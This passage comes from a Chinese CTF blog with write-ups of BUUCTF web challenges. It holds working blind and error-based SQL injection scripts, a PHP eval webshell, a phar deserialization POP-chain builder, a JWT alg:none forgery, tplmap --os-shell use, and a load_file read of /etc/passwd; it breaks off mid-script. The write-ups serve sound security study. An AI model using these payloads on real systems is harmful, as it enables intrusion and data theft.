<blockquote>
<p>不允许出现 none 的方法；</p>
<p>将开启 alg : none 作为一种额外的配置选项。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;&#123;&quot;secretid&quot;:[],&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;,&quot;iat&quot;:1713939995&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-24-03.png" alt="4-24-03"></p>
<h4 id="jwt常见安全问题："><a href="#jwt常见安全问题：" class="headerlink" title="jwt常见安全问题："></a>jwt常见安全问题：</h4><ol>
<li><p><strong>修改算法为none</strong></p>
</li>
<li><p>修改算法从RS256到HS256</p>
</li>
<li><p>信息泄漏 密钥泄漏</p>
</li>
<li><p><strong>爆破密钥</strong></p>
</li>
</ol>
<h4 id="参考：-2"><a href="#参考：-2" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://www.cnblogs.com/hetianlab/p/15044502.html">jwt + wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>最开始三个回显图片，其他无信息，</p>
<p>robots.txt &#x3D;&gt; 告诉我们*.php.apk泄露 &#x3D;&gt; *是通配符，不知道具体的名字</p>
<p>&#x3D;&gt; 看Wp说是 image.php.bak [ 下载 ]</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>); <span class="comment"># 在预定义字符前加\</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>); <span class="comment"># 在变量id中有 \0 %00 \&#x27; &#x27; 的会被替换为空</span></span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>); <span class="comment"># 同上，变量换成了path</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>]; <span class="comment"># ./$path</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>image.php的内容，看到这里有对id和path进行过滤，通过这个过滤</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-25-00.png"></p>
<p>如果给id赋\0 最后变成 \ </p>
<p>再将其放在sql语句中</p>
<p><code>select * from images where id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;</code></p>
<p>-&gt; <code>\&#39;</code>    \将’转义，那么id在这里就变成了 <code>\&#39; or path=</code> </p>
<p>&#x3D;&gt; 且path变量值可控 &#x3D;&#x3D;&#x3D;&gt; sql注入</p>
<p>盲注获取账号密码</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://45465846-21cd-4ff3-b66b-4d74913dc027.node5.buuoj.cn:81/image.php&#x27;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    mid = <span class="built_in">int</span>((head + tail) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> head &lt; tail :</span><br><span class="line">        <span class="comment"># 查表名 images,users</span></span><br><span class="line">        <span class="comment"># payload = &quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># 查列名 username, password</span></span><br><span class="line">        <span class="comment"># payload = &quot; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># 查字段值</span></span><br><span class="line">        <span class="comment"># payload = f&quot; or if(ascii(substr((select group_concat(password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot; # 5196fce7570d38578537</span></span><br><span class="line">        payload = <span class="string">f&quot; or if(ascii(substr((select group_concat(username) from users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span> <span class="comment"># admin</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">        mid = <span class="built_in">int</span>((head + tail) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<p>进入之后，是个上传文件漏洞</p>
<p>随便上传一个，一定要看回显（我做的时候都没注意）</p>
<p>这是将我们上传的文件的文件名放在了日志文件中，访问这个日志文件，发现我们上传过的文件的文件名都在其中</p>
<p>&#x3D;&gt; 将文件名抓包修改成一句话木马，再上传</p>
<p>&#x3D;&gt; 这里对php进行了过滤</p>
<p>-&gt; 短标签绕过</p>
<p><code>&lt;?=@eval($_POST[1]);?&gt;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-25-01.png"></p>
<h2 id="SWPUCTF-2018-SimplePHP（POP链phar反序列化）"><a href="#SWPUCTF-2018-SimplePHP（POP链phar反序列化）" class="headerlink" title="[SWPUCTF 2018]SimplePHP（POP链phar反序列化）"></a>[SWPUCTF 2018]SimplePHP（POP链phar反序列化）</h2><p>ini_set(‘open_basedir’,’&#x2F;var&#x2F;www&#x2F;html&#x2F;‘);<br>-》限制PHP脚本的文件操作范围，规定了PHP脚本只能访问指定的目录及其子目录中的文件</p>
<p><strong>功能点：</strong>查看文件，上传文件<br><strong>信息：</strong></p>
<p>​	没有注意查看文件处 - url&#x2F;file.php?file&#x3D;<br>​	-&gt; 这个url是有参数的，没想到读取任意文件（不敏感）</p>
<p>​	第一时间看到上传文件，就想着上传了 &#x3D;&gt; 只能上传图片，有过滤，且上传成功之后不告诉路径<br><strong>获取源代码：</strong></p>
<p>​	通过查看文件处给的参数 file&#x3D; 尝试文件任意读取 — 成功 ： 读取index.php base.php file.php 各种</p>
<p>​	审计代码<br><strong>思路：</strong></p>
<p>​	上传phar文件 [ 读取f1ag.php ]</p>
<p>​	通过查看文件读取phar文件</p>
<p>​	构造phar反序列化<br><strong>POP链：</strong><br>C1e4r::<code>__destruct()</code> - echo $this-&gt;test;<br>Show::<code>__toString()</code> - $content &#x3D; $this-&gt;str[‘str’]-&gt;source;<br>Test::<code>__get()</code> - return $this-&gt;get($key);<br>Test::get() - return $this-&gt;file_get($value);<br>Test::file_get() - $text &#x3D; base64_encode(file_get_contents($value));</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;str-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;str-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;params = <span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="comment"># O:5:&quot;C1e4r&quot;:2:&#123;s:4:&quot;test&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;file&quot;;N;s:6:&quot;params&quot;;a:1:&#123;s:6:&quot;source&quot;;s:21:&quot;var/www/html/f1ag.php&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure></div>

<h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>题目给出了Flask，想到SSTI注入，但是没有发现可利用的参数，也没有找到其他的信息。</p>
<p>使用工具arjun爆破参数名，第一次听说和使用.</p>
<p><a class="link" href="https://github.com/s0md3v/Arjun">arjun工具github地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-29-00.png" alt="4-29-00"></p>
<p>找到参数名<code>name</code>         测试SSTI注入</p>
<p><code>$&#123;4*4&#125; - &#123;&#123;4*4&#125;&#125;</code></p>
16 返回4444，Jinja2模版

<p><strong>也可以通过工具tplmap来判断注入类型</strong> — 我好早之前下的软件了，可以直接去github上面搜，一般用到的工具github上面都有</p>
<p><code>python2 tplmap.py -u &#39;http://943902f6-cd89-459c-b3d0-331243c9ad38.node3.buuoj.cn/?name=1&#39;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-29-01.png"></p>
<p>这里不仅扫到了是jinja2模版，还说可以进行 –os-shell 命令执行，直接就可以利用工具来getshell了</p>
<p><code>python2 tplmap.py -u &#39;http://943902f6-cd89-459c-b3d0-331243c9ad38.node3.buuoj.cn/?name=1&#39; --os-shell</code></p>
<h2 id="NCTF2019-SQLi-regexp-正则注入"><a href="#NCTF2019-SQLi-regexp-正则注入" class="headerlink" title="[NCTF2019]SQLi [ regexp 正则注入]"></a>[NCTF2019]SQLi [ regexp 正则注入]</h2><p>学习大佬们的正则注入脚本</p>
<p>写sql注入脚本，要找到回显的不同点 — 这个题通过bp爆破模块，配上自己写的正则注入，判断首字母，找到回显的不同处</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://33a70556-1afb-4069-8403-ab493551394d.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">pw_fuzz = string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span> <span class="comment"># 小写字母 数字 下划线</span></span><br><span class="line">pw = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pw_fuzz:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.<span class="built_in">format</span>((pw+i))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;alert&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            pw = pw+i</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br></pre></td></tr></table></figure></div>

<p>参考：</p>
<p><a class="link" href="https://blog.csdn.net/l2872253606/article/details/125265138">wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><strong>1.爆破</strong></p>
<p>-&gt;发帖子需要是登录状态，这是告诉我们密码缺失后三位，只是三位，选择爆破：</p>
<p>&#x3D;&#x3D;&gt; <code>666</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/5-2-00.png"></p>
<p>-&gt; 成功登录之后，虽然可以发帖了，但没有指向的信息了，</p>
<p>-&gt; 测试了一下xss，发现有弹窗，还可以跳转<code>&lt;script&gt;window.location=&quot;http://www.baidu.com&lt;/script&gt;&quot;</code></p>
<p>-&gt; 在F12控制台中，发现了留下的信息<code>只完成了一半，还没有来得及commit</code></p>
<p>&#x3D;&gt; 存在git泄露</p>
<p><strong>2.git泄露</strong></p>
<blockquote>
<p><code>githacker --url URL/.git/ --output-folder ./result</code></p>
</blockquote>
<p>-&gt; 切换到对应目录下 可以尝试查看历史git命令</p>
<blockquote>
<p>git Log –reflog</p>
</blockquote>
<p>-&gt; 选择一个commit的号</p>
<blockquote>
<p>git reset –hard commit号</p>
</blockquote>
<p>&#x3D;&gt; 得到完成的文件泄露 [ 审计代码 ]</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#write_do.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里执行的sql语句是插入语句，插入到board表中，这里有对插入的数据 进行 预防sql注入</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]); <span class="comment"># 在预定义字符前面加上\ -&gt; 防sql注入</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>); <span class="comment"># 返回sql查询结果的 行数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>]; <span class="comment"># 用于用MySQL结果集中获取一行数据</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>-&gt; write分支：向board表中插入 category title content</p>
<p>-&gt; comment分支：通过id编号取出对应的category, 取出category ; 之后又进行了一次插入值, 其中包括category</p>
<p>write分支插入category值，comment分支会引用插入的category进行sql语句的查询</p>
<p>&#x3D;&#x3D;&gt; 二次注入，注入点在category</p>
<p>至于<code>addslashes($_POST[&#39;category&#39;]);</code>不会影响的，它再次取出的时候是原样取出的，没有<code>\</code></p>
<p>注入什么？</p>
<p>这里是高权限用户，可以利用load_file函数，但没有信息告诉我们flag文件在哪，第一时间肯定提取敏感文件，&#x2F;etc&#x2F;passwd等各种文件</p>
<p>payload格式：</p>
<p>Write分支：</p>
<p><code>&#39;,content=load_file(&#39;/etc/passwd&#39;),/*</code></p>
<p>-&gt; ‘单引号闭合，然后后面的content为我们执行的sql语句，因为通过源码格式可以发现要进行多行注释 &#x2F;*</p>
<p>Comment分支：</p>
<p>id要对应好, <code>content=*/#</code></p>
<p>-&gt; *&#x2F;接上多行注释，且单行注释后面的’单引号</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/5-2-01.png"></p>
<hr>
<p>参考：</p>
<p><a class="link" href="https://blog.csdn.net/qq_54929891/article/details/123889141">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>二次注入</title>
    <url>/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="Buu-RCTF2015-EasySQL-二次注入"><a href="#Buu-RCTF2015-EasySQL-二次注入" class="headerlink" title="Buu - [RCTF2015]EasySQL [ 二次注入 ]"></a>Buu - [RCTF2015]EasySQL [ 二次注入 ]</h2><h4 id="拿信息："><a href="#拿信息：" class="headerlink" title="拿信息："></a>拿信息：</h4><p>最近一次做这个题，靠自己看出来的，是一个二次注入题<strong>（注册 -&gt; 数据库）</strong>，在改密码页面<strong>（从数据库中取出）</strong>存在注入（无回显）</p>
<p>刚开始注入时，发现过滤空格 &#x3D;&gt; 可以通过fuzz来测过滤了什么</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-15-01.png"></p>
<blockquote>
<p>Response长度为521的都是被过滤的</p>
</blockquote>
<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>可以通过Hackbar来执行，这样方便一点（因为要多次注册号，多次点击不同页面） — 都是POST传参</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-15-00.png"></p>
<p>-&gt; 第一步将hackbar中url改为register.php，三个参数<code>username=&amp;password=&amp;email=</code>，username是注入语句，其他随便填</p>
<p>-&gt; 执行之后会跳转到login.php页面，将hackbar中url改为login.php，两个参数<code> username=&amp;password=</code>，也就是去掉email参数即可</p>
<p>-&gt; 最后将hackbar中改为changepwd.php，然后会跳转到这个页面，直接输入oldpassword 和 newpassword 提交，就会有回显了</p>
<hr>
<p><strong>1.查表名payload：</strong>flag users article</p>
<p><code>username=123&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#&amp;password=a&amp;email=a</code></p>
<p><strong>2.查列名payload：</strong>回显：XPATH syntax error: ‘:name,pwd,email,real_flag_1s_her’</p>
<p><code>username=123&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#&amp;password=a&amp;email=a</code></p>
<p><strong>3.查字段payload</strong>回显：XPATH syntax error: ‘:flag{55f917ea-5a3e-4d11-b3e8-12’</p>
<p><code>username=123&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#&amp;password=a&amp;email=a</code></p>
<p><strong>4.查后半段flag</strong> 回显：XPATH syntax error: ‘:}02bdd2e29121-8e3b-11d4-e3a5-ae’ <strong>[ 通过切片正向输出 ]</strong></p>
<p><code>username=123&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#&amp;password=a&amp;email=a</code></p>
<p>-&gt; reverse 逆向输出，因为对长度有限制，正向输出flag不全</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-15-02.png"></p>
<hr>
<p><strong><a class="link" href="https://blog.csdn.net/Yb_140/article/details/127807220">脚本出处： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8acdca94-eab8-4f8e-b70e-2aa84977a32b.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">url1=url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">url2=url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">url3=url+<span class="string">&#x27;changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">res=requests.session()</span><br><span class="line"><span class="comment">#例如，如果你在访问一个网站时需要先登录，然后再访问其他需要登录才能查看的页面，你可以使用会话对象来保持登录状态，从而在后续的请求中无需再次登录。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res.post(url=url1, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res.post(url=url2, data=data) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span 